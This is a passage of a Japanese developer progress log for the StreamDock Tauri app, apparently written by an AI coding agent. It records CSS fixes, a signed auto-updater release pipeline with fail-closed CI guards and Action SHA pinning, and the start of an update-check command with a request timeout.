| `docs/tasks/055c-update-notice-and-screen.md` | 054 からの申し送り（役割の規則のみ移す・**px/weight は移さない**・階層は書式と余白の両方で作る） |

### まだ未完了のこと

1. **⚠ 実機確認が一度も済んでいない。** 本セッションの変更はすべて「静的に検証できる範囲」までしか担保がない。
   jsdom は色・サイズ・余白・レイアウトを一切解決しないので、**見た目の正しさはコードレビューでは証明できない**。
2. **⚠ コミット・push していない**（8 ファイル未 staged・ブランチ `main`）。方針どおり本人の明示指示待ち。
3. **`.status`（11px/700）と `.note`（12px/400）の階層逆転**（接続ポップオーバー内）。要実機判断。
   直すなら `.note` を戻すのではなく `.status` を 12px へ寄せる方が 3 段規則と整合する。**別タスク推奨**。
4. **`.connPopover` に `max-height` / `overflow` が無い**（既存構造）。`.note` が 12px＋`line-height:1.5` になり
   縦に伸びたので、狭い窓で下端からはみ出す可能性がある。実機ではみ出したら別タスクで起票。
5. **2 カードの手動手順の非対称**（コメント用は削除済み・固定コメント用は残存）。文言タスクを起票するときに揃える。

### 次にやるべきタスク

1. **実機確認**（`pnpm tauri dev`）——これが最優先。見るべき点:
   - (a) 設定ビューで項目名がすべて同じ太字・濃色 ／ (b) 項目＋説明が 1 ブロックに見え、ブロック同士が離れているか
   - (c) 固定コメントカードの `.note` 5 連続がひとかたまりに見えるか ／ (d) 視聴者詳細「情報の削除」
   - (e) ライト/ダーク両テーマ ／ (f) **本体ツールバーが 1px も動いていないこと**
   - (g) YouTube 接続ピルを開いたポップオーバー（縦の伸び・`.status` と `.note` の階層）
   - (h) OBS カードから 3 本消えた状態で説明が不足していないか
2. 実機 OK なら**コミット**（本人の指示で実行）。
3. その後は **055a リリース基盤**（`docs/tasks/055a-updater-release-pipeline.md`・IDE で開かれていたファイル）。
   実装順は 055a → 055b → 055c → 055d → 055e。**⚠ 絶対制約: 055a〜055d は 099 の実タグ push・publish より前に完了させること。**
   055c 着手時は 054 の申し送り（役割の規則だけ移す・**px/weight の実値は移さない**）を必ず読むこと。
4. 052（VOICEVOX ポーリングのタイムアウト）は 054 とは独立。着手順は本人判断。

### 既知のエラー

**なし**（`typecheck` / `lint` / `test` / `check:css` すべて green・`pnpm build` も成功）。
以下は**エラーではなく、意図的に残した穴**（機械が「どこからが退行か」を決められないもの）:

- `.note` の `font-size` を 11px に戻す ／ `line-height` を消す変異は**ガードを通る**（(6-b) は色だけを見る）。
  格上げ方針は CSS の `.note` コメントに記載。
- `.fieldLabel` を `@media` の中へ移す変異も通る（ルールとしては実在するため、条件付きになったことは検出できない）。
- **窓名 `StreamDock コメントオーバーレイ` の一致は `src-tauri/src/lib.rs` の `.title` ↔
  `apps/comment-sidecar/src/obs/obs-client.ts` の `OBS_SOURCE_NAME` の 2 者間契約だけになった。**
  desktop のテストからは見えないので、**窓名を変えるときは 2 ファイルを必ず同時に直すこと**。

### 実行した確認コマンド

```bash
# 静的検査（すべて green）
pnpm --filter ./apps/desktop typecheck
pnpm --filter ./apps/desktop lint
pnpm --filter ./apps/desktop test          # 26 files / 461 tests + pnpm check:css
node apps/desktop/scripts/check-css-guards.mjs

# CSS Modules のスコープ実測（隣接兄弟 `+` はこのリポジトリの CSS モジュール初使用）
pnpm --filter ./apps/desktop build
#   → ._cardBody_1uepz_636>*+._note_1uepz_10{...} で同一ハッシュのスコープを確認

# 差分の範囲確認
git status --short
git diff --stat
git status --short -- apps/desktop/src-tauri/ apps/comment-sidecar/ apps/desktop/package.json \
  pnpm-lock.yaml apps/desktop/src/styles/theme.css docs/security.md   # すべて差分ゼロ
grep -nE "#[0-9a-fA-F]{3,8}|rgba?\(" apps/desktop/src/screens/comment-viewer/CommentViewerApp.module.css  # 0 件

# ミューテーション（作業ツリー非破壊・scratchpad へ隔離コピーして実走）
#   ガード (6): 31 種（退行はすべて FAIL・正しい CSS はすべて PASS）
#   ガード (7): 14 種（同上）
#   既存 (1) 非退行: .item の flex-shrink 全削除 → exit 1
```

**実機（`pnpm tauri dev`）は未実行。**

### 次回セッションで最初に読むべきファイル

1. **`docs/progress.md` の「2026-08-01 (054 内蔵コメビュ設定画面の可読性修正 …)」節**（本セッションの全記録・この引き継ぎまで）。
2. `docs/task-board.md` の 054 行（追補①②の要約）と **055 ブロック**（次の実装対象と絶対制約）。
3. `apps/desktop/src/screens/comment-viewer/CommentViewerApp.module.css` **先頭の 3 段規則コメント**
   （この窓のタイポグラフィと余白の「正」。`.cardBody` / `.note` / `.fieldLabel` / `.speakerField` の各コメントも）。
4. `apps/desktop/scripts/check-css-guards.mjs` の **(6) と (7)**（何を守っていて、何を意図的に守っていないか）。
5. 055 へ進むなら `docs/tasks/055a-updater-release-pipeline.md`。055c を触るなら
   `docs/tasks/055c-update-notice-and-screen.md` **冒頭の 054 申し送り**を先に読むこと。
6. OS 操作・ファイル操作・プロセス操作・外部通信に触れる変更をするなら `docs/security.md`（今回は不変）。

## 2026-08-01 (055a リリース基盤 —— バージョン同期＋updater 署名鍵＋CI 成果物＋latest.json／**アプリコード差分ゼロ**)

> 状態: **実装完了・CI 空回し未実施・未コミット**。空回しは依頼者が GitHub の Actions 画面から実行する。
> タスク [docs/tasks/055a-updater-release-pipeline.md](tasks/055a-updater-release-pipeline.md)／親 [055](tasks/055-app-self-update.md)。

### やったこと（配布側だけ・アプリは何も変わっていない）

updater が動くための**配る側**を用意した。終了時点で「アプリはまだ更新を見に行かないが、public リリースに
`latest.json` と `.sig` が並ぶ」状態。受け取る側（plugin 導入・Rust コマンド・UI）は 055b 以降。

**(1) バージョン同期ガード（新規 `apps/desktop/scripts/check-version-sync.mjs`・依存ゼロ）**

- 5 箇所（root / desktop / sidecar の `package.json`、`Cargo.toml` の `[package]`、`tauri.conf.json`）を検査。
- `pnpm check:version` を追加し、`test` を `vitest run && pnpm check:css && pnpm check:version` に。
- `--expect` / `EXPECT_VERSION` を受ける。**CI のタグ検証は同じスクリプトを使う**（二重管理を作らない）。
- `Cargo.toml` は**セクションを追う行走査**で `[package]` の version だけを拾う。正規表現一発だと
  `tauri = { version = "2" }` に先に当たり「アプリのバージョンを 1 度も見ないまま緑になる検査」ができあがる。

**(2) `tauri.conf.json`** —— `bundle.createUpdaterArtifacts: true` と `plugins.updater` を新設。
`endpoints` は `https://github.com/satoh23/StreamDock-releases/releases/latest/download/latest.json` の**1 本のみ**・
**動的プレースホルダなし**（バージョンを外部へ送らない＝親 055 の egress 定義）。`pubkey` は本人が生成した公開鍵
（**非機密**・鍵 ID `63401191CF3C28B7`）。`windows.installMode: "passive"`（実挙動の確定は 099b）。**`csp: null` 不変**。

**(3) `release.yml`** —— ステップ名で特定できるよう以下を追加・変更した。

- build: `Check version sync`（重いビルドの前。タグ push 時は `EXPECT_VERSION` でタグ名一致も見る）
- build: `Build installers` に `TAURI_SIGNING_PRIVATE_KEY` / `…_PASSWORD` を env で渡す（`echo` しない）
- build: `Verify updater artifacts`（新設・下記③）
- build: `Guard - post-build signing breaks updater signature (099a)`（新設・下記④）
- build: `Upload installers (artifact)` の glob に `macos/*.app.tar.gz(.sig)` / `nsis/*.sig` / `msi/*.sig` を追加
- release: `Checkout`（**`Download all installers` より前**。checkout は既定 `clean: true` で dist/ を消すため）
- release: `Generate latest.json`（素の node・**新 Action を増やさない**）
- release: `Publish to…` に `body_path: release-body.md`。**`draft: true` は維持**

**(4) `docs/release-notes/`** —— `README.md`（雛形・055e が描画できる記法だけ）と `v0.1.0.md`（実物 1 本）。

**(5) 文書** —— README のリリース手順を全面改訂（3→5 箇所・**ノートを先に書く**・**publish＝配信開始**・
鍵の Secrets 名と紛失時の帰結・ローカル `pnpm tauri build` にも鍵 env が要ること）。099a に CI ガードの申し送り。

### 依頼者の指示で必ず残す 6 点

**① 空回しと「リリースノート必須」の両立をどう解決したか**

タスクどおりに「ノートが無ければ fail」を実装すると、`workflow_dispatch` では `RELEASE_TAG` が `ci-<run番号>` に
なるため `docs/release-notes/ci-123.md` が存在せず**必ず落ちる**。しかし完了条件は「空回し 1 回で draft を目視確認」
＝両立しない。加えて `latest.json` の `version` が `ci-123` になり **semver ではない**。

解決: **`version` の出どころを `tauri.conf.json` に 1 本化**し、**notes は `docs/release-notes/v<version>.md`** を見る
（タグ名を使わない）。必須判定は **`github.ref_type == 'tag'` のときだけ**効かせ、dispatch でファイルが無ければ
プレースホルダ＋`::warning` で続行する。あわせて **`v0.1.0.md` を実物として置いた**ので、空回しでも notes 経路は
プレースホルダではなく**実データ**で通る（＝完了条件「notes にファイルの内容がそのまま入っている」を空回しだけで検証できる）。
**タグ push 経路には抜け道を作っていない。**

**② `latest.json` の実物** —— **空回しで確定済み（2026-08-01）**。詳細は 055a タスクファイルの
「空回しで確定した実ファイル名と `platforms` キー」節を正とする。
生成側の実装は「`dist/` を再帰走査し拡張子で発見」＝**固定パスもファイル名も決め打ちしていない**。
`platforms` のキーは `darwin-aarch64` / `darwin-x86_64` / `darwin-universal`（3 つとも同一の universal
`StreamDock.app.tar.gz` を指す）＋ `windows-x86_64`（`StreamDock_0.1.0_x64-setup.exe`）。
**キーの妥当性はレビューで静的に確定した**（下の「レビュー指摘の反映」Q-2 / Q-3）。

**③ updater 成果物の欠落検出**

`upload-artifact` の `if-no-files-found: error` は**全パターンが 0 件のときしか失敗しない**ため、`.sig` が 1 つも
生成されなくても既存の dmg/exe が拾われる限り CI は緑で通る。そこで **2 段**にした。
(a) build ジョブの `Verify updater artifacts`（OS ごとに存在確認。bundle ディレクトリの中身も出力＝実ファイル名の確認用）。
(b) `make-latest-json.mjs` を **fail-closed** に（mac/win いずれか欠落・`.sig` と実体が対でない・候補が複数で
一意に決まらない → すべて `exit 1`）。**中身の欠けた `latest.json` は原理的に出ない。**

**④ eSigner 地雷 —— 記録だけでなく CI ガードにした**

`sslcom/esigner-codesign` は tauri ビルド**後**に `override: true` で置換署名する＝**バイト列が変わり minisign `.sig` と
食い違う**。壊れ方が「CI 緑・インストーラも動く・**自己更新だけが署名検証で落ちる**」で 099b の実機 E2E まで発覚しない。
`check-css-guards.mjs` 冒頭の「コメントはファイル境界を越えないので、境界を越える検査が要る」（同じバグ 3 回）と同型なので、
**申し送り（既に b182801 で 099a に存在）に加えて機械のガードを入れた**。
判定＝`createUpdaterArtifacts` が真 かつ `bundle.windows.signCommand` 未設定 → fail。
実行条件は既存の `HAS_WINDOWS_SIGNING == 'true'` ＝ **今日は no-op**、099a で Secrets を入れた瞬間に署名より前で止まる。

**⑤ 前借りフォールバック —— 該当しないことが確定した**（当初は「空回しで確定」としていた）

安価な事前確認は 2 つ実施済み: `cargo check` 通過（`tauri-build` が型付きで `createUpdaterArtifacts` を読むため
スキーマ不正ならここで落ちる）、`tauri info` 通過（設定パース・plugin 一覧に異常なし）。
どちらも bundle 段階の可否は確定しなかったが、**レビューで tauri-cli 2.11.4（= 手元の `@tauri-apps/cli` と同版）の
ソースを読んで確定した**: `interface/rust.rs` は `create_updater_artifacts != Bool(false)` のとき
**`config.plugins` の `"updater"` キーだけ**を見て（無ければ `plugins > updater doesn't exist` で落ちる）、
**`Cargo.toml` の依存も `lib.rs` の plugin 登録も一切参照しない**。`bundle.rs` の `sign_updaters` も
`settings.updater()`（config 由来）しか見ない。＝**`plugins.updater` が config にあれば bundle は通る＝前借り不要。**

**⑥ ミューテーション確認の結果（完了条件）—— 9/9 一致**

作業ツリー非破壊（元バイト列を退避 →書き換え →実行 →`finally` で必ず復元）で実走した。
- (1)〜(5) 5 箇所を 1 つずつ `0.1.1` へ → **すべて FAIL**
- (6) `[package]` の version 行を削除 / (7) root の `version` キーを削除 → **FAIL**（fail-closed。黙って素通りしない）
- (8) `[dependencies]` の `tauri = { version = "2" }` を書き換え / (9) `# version = "9.9.9"` コメント追加 → **PASS**（誤ヒットなし）

`make-latest-json.mjs` も **7/7**: 正常系（notes が `v0.1.0.md` と一致・キー 4 つ・URL 生成）／mac 成果物欠落／
`.sig` の片割れのみ／候補複数／`.exe.sig` だけ欠落 → すべて FAIL、notes 無し×タグ push → FAIL、
notes 無し×空回し → プレースホルダで続行。
eSigner ガードも 3 状態で確認（現状 OK ／ `createUpdaterArtifacts` だけ true → FAIL ／ `signCommand` も設定 → OK）。

### そのほかの決定

- **`tauri-apps/tauri-action` をコミット SHA へ固定**した（`@v0` → `84b9d35b5fc46c1e45415bdb6144030364f7ebc5`
  ＝ `action-v0.6.2`）。**本タスクから updater 秘密鍵を env で渡すため**で、099a が
  `sslcom/esigner-codesign@develop` について書いている理屈と同じ。固定時点で `v0` が指していた commit と同一なので
  **挙動は変わらない**。なお `action-v1.0.0` が出ているが `v0` は追随しておらず、**v1 移行は別判断**（本タスクではやらない）。
- **`.msi` を updater 対象にしない**（`latest.json` は NSIS `.exe` を指す）。Tauri の Windows 自己更新の標準経路が
  NSIS で `installMode` も NSIS の概念だから。`.msi` の `.sig` は収集するが未使用。
  ⚠ **訂正（レビュー Q-2）**: 当初ここに「1 キー 1 URL のため両方は載せられない」と書いていたが**誤り**。
  下の Q-2 参照。
- **`sslcom/esigner-codesign@develop` の SHA 固定は 099a の領分のまま**（本タスクでは触っていない）。

### 検証（実測）

```bash
pnpm --filter ./apps/desktop typecheck   # 通過
pnpm --filter ./apps/desktop lint        # 通過
pnpm --filter ./apps/desktop test        # 461 tests + CSS ガード + バージョン同期ガード すべて緑
cd apps/desktop/src-tauri && cargo check # 通過（tauri.conf.json の型付きフィールドも検証される）

# ゼロ拡大の担保（すべて差分ゼロを確認）
git status --short -- apps/desktop/src/ apps/desktop/src-tauri/src/ apps/comment-sidecar/src/
git status --short -- apps/desktop/src-tauri/capabilities/
git status --short -- apps/desktop/src-tauri/Cargo.toml apps/desktop/src-tauri/Cargo.lock pnpm-lock.yaml
```

差分は `.github/workflows/release.yml` / `README.md` / `apps/desktop/package.json` /
`apps/desktop/src-tauri/tauri.conf.json` / `docs/tasks/099a-*.md` の 5 ファイルと、
新規 `.github/scripts/`（2 本）/ `apps/desktop/scripts/check-version-sync.mjs` / `docs/release-notes/`（2 本）。

### レビュー指摘の反映（2026-08-01・security-review ＋ 品質レビュー）

判定は **「軽微な懸念あり・修正必須ゼロ」**。必須 2 点（ログに秘密鍵が出ない／`endpoints` が単一の
コンパイル時定数）と、アプリ不変性・capability/CSP 不変・新規 Action ゼロは実測で確認された。
そのうえで出た指摘に以下のとおり対応した。

**S-1【最重要】署名鍵の取り違えが CI のどこでも止まらなかった → `make-latest-json.mjs` に検査を追加**

tauri-cli の `sign_updaters` は、`TAURI_SIGNING_PRIVATE_KEY` の鍵と `plugins.updater.pubkey` が食い違っても
**`log::warn!` を出すだけでビルドを続行する**。＝間違った鍵で署名された `.sig` は生成され、
`Verify updater artifacts`（存在確認だけ）も `make-latest-json.mjs`（`.sig` の中身を載せるだけ）も素通りし、
**CI 緑・インストーラも動く・publish 後に全ユーザーの更新だけが署名検証で落ちる**——
④の eSigner 地雷とまったく同型の穴が鍵側に残っていた。Secrets の貼り間違い・鍵ローテーションで容易に起きる。

対処（依存ゼロ）: minisign のボックスは `base64(テキスト)` で、2 行目が `alg(2) + keynum(8) + 本体`。
**keynum（バイト 2..10）が鍵ペアの同一性**なので、`.sig` と `pubkey` の keynum を突き合わせて不一致なら fail する。
alg は公開鍵が `Ed`、署名は prehash 有無で `Ed`/`ED` と揺れうるので**先頭 2 バイトは比較しない**。
併せて `.sig` の trusted comment（`timestamp:<unix>\tfile:<名前>`）と実体名も照合する。
ダミー `dist/` で **5/5 一致**を実走確認（正常 → exit 0 ／別鍵・名前不一致・壊れた `.sig`・mac 欠落 → すべて exit 1）。

**S-2 空回しの誤 publish → `prerelease` ＋警告バナーで機械的に無害化**

防御が「既定 draft／下書き名／README の注意」＝**すべて人間依存**だった。しかも `v0.1.0.md` を実物として置いた結果、
空回しの下書きが本物のリリースと見分けがつかない（プレースホルダが出るのは notes 無しのときだけ）。
対処: `Publish to public releases repo (draft)` に **`prerelease: ${{ github.ref_type != 'tag' }}`**。
GitHub の `releases/latest` は **draft と prerelease の両方を除外**するので、誤 publish しても updater には見えない。
併せて空回しの Release 本文の先頭に警告バナーを入れた（`latest.json` の `notes` は素のまま
＝「notes がファイルの内容そのまま」を空回しだけで検証できる状態を保つ）。

**S-3 / S-4 供給網とジョブの資格情報**

- `dtolnay/rust-toolchain@stable` は**ブランチ参照**で、秘密鍵を持つジョブに同居していた。
  `4cda84d5c5c54efe2404f9d843567869ab1699d4`（固定時点の `stable` ブランチ HEAD）へ固定。
  `inputs.toolchain` の既定は `stable` のままなので**インストールされる Rust は従来どおり stable 最新＝挙動不変**。
  ステップ単位の `env` は他ステップに漏れないが、同一ジョブの Action は PATH/ワークスペースを書き換えられるため。
- build ジョブの `Checkout` に **`persist-credentials: false`** を追加（release ジョブと揃えた）。
  `tauri-action` は `tagName` を渡していない＝Release を作らないので git 資格情報は不要、
  `pnpm-lock.yaml` に git 依存も無いことを確認済み。
- `tauri-action` の SHA は GitHub API で検証済み: `84b9d35b…` は `refs/tags/action-v0.6.2` の commit と一致し、
  現在の `v0`（annotated tag）をデリファレンスしても同一 commit ＝「挙動不変」の記述は正しかった。
- `sslcom/esigner-codesign@develop` は 099a の領分として据え置き。**下記 Q-5 のガードにより
  `signCommand` 移行前は当該ステップへ到達しない**ので、現時点で実行されることはない。

**S-5 security.md を変更しなかった判断 → 妥当（追認）**。根拠と**再修正トリガー**を 055a タスクファイルの
「security.md を変更しなかった判断」節に明記した。

**S-6 精度**: 「アプリの実行時の振る舞いは 1 ビットも変わっていない」は正確には
**「実行時の振る舞いは不変だが、バイナリのバイト列は変わる」**。`tauri-build` が `tauri.conf.json` を
バイナリへ埋め込むため、endpoint URL と pubkey は配布バイナリ内の文字列として存在する（どちらも公開値）。
runtime で `plugins.updater` を読むのは updater plugin だけ＝**plugin 未登録なので誰も読まない**。

**Q-1【重】`Verify updater artifacts` の `set -uo pipefail` は「`-e` なし」になっていなかった**

`shell: bash` を明示すると GitHub は `bash --noprofile --norc -eo pipefail {0}` で起動する＝**`-e` は最初から有効**で、
`set -uo pipefail` は `-u` を足すだけ。`$(find … | head -n1)` は `pipefail` と `-e` の組み合わせにより、
find の非ゼロ終了（探索エラー・head の早期終了による SIGPIPE）で**代入の時点でステップが即死**し、
`::error::` も bundle 一覧も出ない＝本ステップの主目的（実ファイル名をログに残す）が失敗時にだけ失われる。
Windows の git-bash では find が非ゼロを返しやすく実際に起こりうる。**`set +e` を明示**して意図どおりにした。

**Q-2 「1 キー 1 URL のため `.exe` と `.msi` の両方は載せられない」は事実誤り → 訂正**

`tauri-plugin-updater` の `get_urls` は **`{os}-{arch}-{installer}` → `{os}-{arch}` の 2 段**で検索し、
`Installer::name()` は `app` / `nsis` / `msi` / `deb` / `rpm` / `appimage`。
＝ `windows-x86_64-nsis` と `windows-x86_64-msi` を**両方載せられる**。NSIS 一本にしている本当の理由は
「標準経路が NSIS で `installMode` も NSIS の概念であり、**MSI 経路の自己更新を 099b でまだ検証していない**」から。
なお現在の `windows-x86_64` は 2 段目のフォールバックなので、**MSI で入れたユーザーにも NSIS の `.exe` が配られる**
（インストール形式が入れ替わる）。**099b の確認項目に追加した。**

**Q-3 `darwin-universal` を足した理由が成立していなかった → コメント訂正**

`get_urls` は `darwin-universal` を**一度も引かない**（キーは `{os}-{arch}[-{installer}]` のみ）。
`platforms` は `HashMap` なので余分なキーは単に無視される＝**害は無く、判断の結果は安全側で正しい**。
「Tauri のバージョンによってはこちらを見る経路がある」という根拠だけが誤りだったのでコメントを直した。
実際に当たるのは macOS `darwin-<arch>`（2 段目）／Windows `windows-x86_64`（2 段目）。

**Q-4 `pub_date` は通る。ただし失敗時の壊れ方が「pub_date だけ無視」ではない → コメントで記録**

`RemoteRelease` の `Deserialize` は `pub_date` のパースに失敗すると `DeError::custom` を返す＝
**`latest.json` 全体のデシリアライズが失敗し、更新チェックが丸ごとエラーになる**。
`toISOString()` の小数秒付き（`…T00:00:00.000Z`）は RFC 3339 の `time-secfrac` として正当で
`time` crate の `Rfc3339` も受理するので**現状の実装で問題ない**。
再修正トリガー（099b で `invalid value for pub_date` が出たらフィールドごと落とす。`Option` なので無くても成立）を
`make-latest-json.mjs` にコメントで残した。

**Q-5 eSigner ガードが片側しか見ていなかった → 両側判定にし、ビルド前へ移動**

`signCommand` を設定しさえすれば通り、**ビルド後の置換署名ステップが残っていても検出しなかった**。
「移行途中で気を抜いた」＝一番ありそうな失敗が素通りする。`release.yml` をステップ単位（`- name:` で分割）に切って
`sslcom/esigner-codesign` × `override: true` が残っていたら fail する判定を追加（YAML パーサは持ち込まず文字列検査）。
併せて `tauri.conf.json` とワークフローを読むだけなので **`Check version sync` の隣＝重いビルドの前**へ移した。
4 状態で実走確認（現状 → FAIL ／ `signCommand` だけ設定 → **新判定で FAIL** ／ 移行完了 → OK ／
`createUpdaterArtifacts` false → OK）。

**その他（軽微）**

- `make-latest-json.mjs`: `p.split("/").pop()` → `node:path` の `basename`（POSIX 区切り決め打ちの解消）。
- `check-version-sync.mjs`: 基準を `found[0]` ではなく **`baseline: true` フラグ**で選ぶ（配列の並べ替えで
  黙って基準がすり替わらない）。`--expect` の semver 検査を**末尾までアンカー**（`0.1.0garbage` を弾く）。
  ⚠ プレリリース（`0.2.0-beta.1`）は形としては通るが **Windows の MSI/NSIS が受け付けない**旨をコメントに追記。
  変更後にミューテーション再走: 5/5 一致（5 箇所のズレ・キー削除で FAIL、依存クレートの version 書換で PASS）。
- `docs/release-notes/v0.1.0.md`: **箇条書きの折返し継続行**（雛形の記法一覧に無く、055e では別段落に割れる）を解消し、
  1 行 1 項目にした。併せて**前提条件**を追記（読み上げは VOICEVOX の別途インストールが必要／コメントビューアは
  各サービスへのログインが必要／OBS 自動追加は obs-websocket 有効化と設定 ON が必要）。
  内容と実装の突合では**事実誤認は無かった**が、前提が書かれておらず「無条件にできる」と読めた。
- `.gitignore` に `release-body.md` を追加。
- README: 手順 1 に「**これから付けるバージョン番号**で作る・CI はタグ名ではなく `tauri.conf.json` の
  `version` でファイルを探す」を明記。ローカルビルドで鍵を**パスワード無し**にした場合は
  `TAURI_SIGNING_PRIVATE_KEY_PASSWORD=''` を明示 export しないと対話プロンプトで止まることを追記。
- release ジョブが `actions/setup-node` を通さず**ランナー既定の node** を使っている点をコメントで明示。
- `Verify updater artifacts` の Windows 側が `.sig` しか見ない（macOS と非対称）理由をコメントで明示。

### 空回し（`workflow_dispatch`）の結果と、そこで決めたこと（2026-08-01）

**1 回目 —— `TAURI_SIGNING_PRIVATE_KEY` の値が 1 文字壊れていて両 OS とも同じ場所で落ちた。**

エラーは `failed to decode base64 key: Invalid symbol 37, offset 348.`。base64 クレートの
`InvalidByte(index, byte)` なので **バイト 37 = `%`** が **349 文字目**にある、という意味。
ローカルの鍵ファイルは 348 バイトちょうど・末尾は `=`（改行なし）・base64 として完全に妥当だったので、
**Secrets に入った値だけが `ファイルの中身 + %`** になっていた。原因は **zsh が「改行で終わらない出力」の末尾に
出す反転表示の `%`** を、`cat` の出力から選択コピーしたときに一緒に拾ったこと。
対処は `pbcopy < ~/.tauri/stream-dock-updater.key` で貼り直し（`pbpaste | wc -c` が 348 になることを確認）。

この失敗で**副次的に確定したこと**（無駄ではなかった）:

- **前借りフォールバックは不要**が実挙動でも裏付けられた。`createUpdaterArtifacts: true` なのに Rust に
  `tauri-plugin-updater` が無い状態で **bundle は完走した**（`Finished 2 bundles at:`）。
- **Windows の実ファイル名が確定**（`StreamDock_0.1.0_x64-setup.exe` / `StreamDock_0.1.0_x64_en-US.msi`）。
- **署名はバンドルの後**であることが実挙動で確認できた ＝ eSigner ガードの前提が正しい。
- **fail-closed が効いた**（`.sig` が作れない → build ジョブが落ちる → 不完全な成果物は public 側に出ない）。
- **ログに鍵の中身は 1 バイトも出ていない**（§9 の観点でも問題なし）。

**2 回目 —— 両 OS とも緑。draft に 8 ファイルが並んだ。** 実ファイル名・サイズの検算結果は
055a タスクファイルの該当節を正とする（`.sig` のサイズも `latest.json` のサイズも理論値と一致・
全ファイル名が URL エンコードで不変＝`url` と GitHub のアセット名がズレる余地なし）。

**そこで決めたこと: `.msi`(WiX) を配布対象から外す（本人の決定）**

draft に `.msi` が並んでいたが、`latest.json` の `windows-x86_64` は NSIS の `.exe` しか指さない
（これは 2 段目のフォールバックなので **`.msi` で入れたユーザーにも NSIS が配られる**＝更新のたびに
インストール形式が入れ替わり、アンインストールのエントリが二重化しうる）。
本人の判断は「**危ないなら消す。使わないなら出す意味がない**」。

- `tauri.conf.json` の `bundle.targets` を **`"all"` → `["app", "dmg", "nsis"]`**。
  ⚠ **`app` は必ず含める**。tauri-bundler は `PackageType::MacOsBundle` が package types に無いと
  **`.app.tar.gz` を作らない**ので、`dmg` だけにすると **mac の自己更新が丸ごと死ぬ**。
  `package_types()` はプラットフォーム外の指定を黙って除外するため、この 1 リストで mac（app+dmg）と
  Windows（nsis）の両方が正しく効く。
- `release.yml` から `msi/*.msi` / `msi/*.sig` の glob、`Sign WiX installer (.msi)` ステップ、
  `Locate Windows installers` の `msi=` 出力を削除。**099a の署名対象も `.exe` だけ**になった。
- `make-latest-json.mjs` は `.msi` を見つけたら `::warning`（`bundle.targets` に戻ったのに `latest.json` を
  直し忘れる、を防ぐ検知として残す）。
- **099b の E2E-8b は再現条件が消えたので実施不要**にした（「MSI で入れたユーザー」が存在しなくなるため）。

なお「どのファイルを落とすか」の案内は **別途ダウンロードサイトを作る想定**（本人の決定）なので、
Release 本文やリリースノートには書かない。＝ `docs/release-notes/vX.Y.Z.md` は
「Release 本文とアプリ内アップデート画面の両方に流れる」単一ソースのままでよい。

### 未完了・次にやること

1. ~~CI 空回し~~ **完了**（上記）。~~Secrets 登録~~ **完了**。~~実ファイル名の記録~~ **完了**。
2. **`.msi` 除外後の再空回し** —— `bundle.targets` を変えたので**もう 1 回だけ空回しが要る**。確認するのは
   ① draft の添付から `.msi` と `.msi.sig` が消えていること ② **`StreamDock.app.tar.gz` と `.sig` が今までどおり
   出ていること**（`app` を targets に残した効果。ここが消えていたら mac の自己更新が死ぬ）
   ③ `Generate latest.json` のログに `.msi` の `::warning` が出ていないこと。
3. 確認後、`ci-<番号>` の draft を削除する（残すと将来の誤 publish の的になる）。
4. **コミットは未実施**（依頼者の明示指示待ち）。
   ⚠ レビュー Q-17 の提案: この差分には独立に価値がある塊が 3 つ（**バージョン同期ガード** /
   **updater 配布基盤** / **eSigner ガード**）同居している。CLAUDE.md の「1 回の作業で複数機能をまとめて
   実装しない」に照らすと **2〜3 本に分けられる**（バージョン同期ガードは updater と無関係に有用）。
   分けるなら未コミットの今が唯一の機会。

## 2026-08-01 (055b 更新検出エンジン —— updater plugin 導入＋Rust コマンド 1 本／**UI なし**)

> 状態: **実装完了・静的検証すべて緑・実機 DevTools 確認は未実施（依頼者の手番）・未コミット**。
> タスク [docs/tasks/055b-updater-check-command.md](tasks/055b-updater-check-command.md)／親 [055](tasks/055-app-self-update.md)。
> 055a（配布側）の続きで、**受け取る側**の最初の 1 枚。UI は 055c、DL/インストール/再起動は 055d。

### やったこと

「更新があるか」だけを判定する **Rust コマンド 1 本**（`check_app_update`）と、その薄い invoke ラッパを作った。
**UI は 1 つも作っていない**（ベル・バッジ・画面・起動時フックはすべて 055c）。

- `Cargo.toml`: `tauri-plugin-updater`（理由コメント付き）。**JS 側の依存はゼロ増**。
- `lib.rs`: `mod app_update;` ／ `.plugin(tauri_plugin_updater::Builder::new().build())`（**capability に
  `updater:*` を付与しない**旨のコメントを shell の既存コメントと同じ調子で）／`generate_handler!` に 1 行。
- `error.rs`: `ErrorCode::UpdateCheckFailed` ＋ `AppError::update_check_failed()`。
- 新規 `src-tauri/src/app_update/`（`mod.rs` / `commands.rs` の **2 層**。DB を持たないので service/repository は作らない）。
- 新規 `src/features/app-update/`（`bindings/AppUpdateStatus.ts`〈生成〉/ `appUpdateApi.ts` / `appUpdateApi.test.ts`）。
- `package.json` の `check:bindings` のパス列挙に `src/features/app-update/bindings` を追加。
- `docs/security.md` に 3 箇所（§1 例外 / §10 依存 / Capabilities 方針の 055b 節）。

### 依頼者の指示で必ず残す 6 点

**① タイムアウトをどう扱ったか（値・設定方法・確認結果）**

タスクファイルは **panic（invoke の Promise が永久未解決）** を強く警戒していたが、**同じ症状はハングでも起こせる**。
`app.updater()?.check().await` の実体は reqwest の HTTP GET で、**reqwest は既定でタイムアウトを持たない**。
ネットワークが「切断」ではなく**「繋がるが応答しない」**（キャプティブポータル・パケット落ち）状態では
`check()` が返らず、055c の UI が「確認中」から永久に戻らない——**panic を全部潰しても同じ事故になる**。
機内モードは即 fail するのでこの経路では再現しない。

採用したのは **`UpdaterBuilder::timeout(Duration::from_secs(15))`**（`CHECK_TIMEOUT` 定数）。

```rust
app.updater_builder()      // endpoints / pubkey は tauri.conf.json 由来のまま
   .timeout(CHECK_TIMEOUT) // ← 足すのはこれだけ
   .build()
```

**`endpoints` を触っていない**ことは crate のソースで確認済み: `UpdaterExt::updater_builder()` は
`state::<UpdaterState>()` から config（endpoints / pubkey）を読み、`.timeout()` は `self.timeout` を
差し替えるだけ。`.endpoints()` を呼ばないことは契約テストで機械的に固定した（後述③）。
15 秒の根拠は「取得対象が `latest.json` 1 本（1KB 前後）＋302 リダイレクト 1 回」で十分に緩く、
起動時の自動チェックが遅い回線で稀に空振りしても実害が無い側に倒せるから。

⚠ **却下した案**: `.configure_client(|c| c.connect_timeout(…).read_timeout(…))`。`Update` に持ち越されないので
055d への副作用が無い点は優れるが、reqwest の `ClientBuilder`（plugin の実装詳細）に直接依存し、
`reqwest` を直接依存に書いていないのに API 面だけ使う形になるため採らなかった。

⚠ **055d への申し送り** —— ⚠ **この段落は当初「事実と逆」を書いていた。下記「レビュー対応」で訂正済み。**
